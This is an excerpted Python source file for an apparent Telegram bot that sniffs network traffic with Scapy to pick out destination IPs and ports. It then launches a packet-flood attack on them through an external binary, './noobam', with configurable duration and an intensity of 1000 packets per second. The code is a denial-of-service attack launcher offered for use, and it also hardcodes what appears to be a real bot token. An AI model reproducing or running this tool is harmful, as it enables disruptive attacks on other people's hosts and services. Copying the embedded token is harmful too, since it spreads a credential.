...
from scapy.all import sniff, IP, TCP  # Scapy for network sniffing
...
cooldown_duration = 300  # Default cooldown duration (5 minutes)
attack_intensity = 1000  # Default attack intensity (packets per second)
...
# Function to sniff IP and port using Scapy
def sniff_ips_ports():
    def packet_callback(packet):
        if IP in packet and TCP in packet:
            ip_dst = packet[IP].dst  # Destination IP
            port_dst = packet[TCP].dport  # Destination port
...
async def start_attack(query):
    ...
    if not detected_ips:
        await query.answer("No IPs or ports detected yet. Please wait for Scapy to sniff traffic.")
        return
    ...
    def run_attack():
        ...
        try:
            ...
            full_command = f"./noobam {target} {port} {attack_time} {attack_intensity}"
...
def main():
    ...
    bot_token = "7519734348:AAGVwlKOukmrss82lyIN8GWzdZBYLh9dKvI"
